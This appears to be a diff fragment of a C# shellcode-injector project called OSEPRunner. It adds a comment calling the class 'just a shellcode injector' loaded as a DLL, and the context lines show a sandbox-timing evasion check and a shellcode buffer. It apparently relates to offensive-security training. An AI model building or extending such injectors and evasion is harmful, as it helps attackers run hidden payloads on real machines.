@@ -1,4 +1,8 @@
-﻿using System;
+﻿//Generates a DLL that can exports the OSEPRunner class. OSEPRunner is just a shellcode injector.
+//Load the DLL and invoke OSEPRunner
+
+
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
@@ -32,13 +36,8 @@ namespace OSEP
         public OSEPRunner()
         {
             
-
-
-
             if (CONFIG.DETECT_SANDBOX_TIME)
                 Evasion.SandboxTimeDetect(2000);
-
-
 
             int size = CONFIG.SHELLCODE.Length;
 
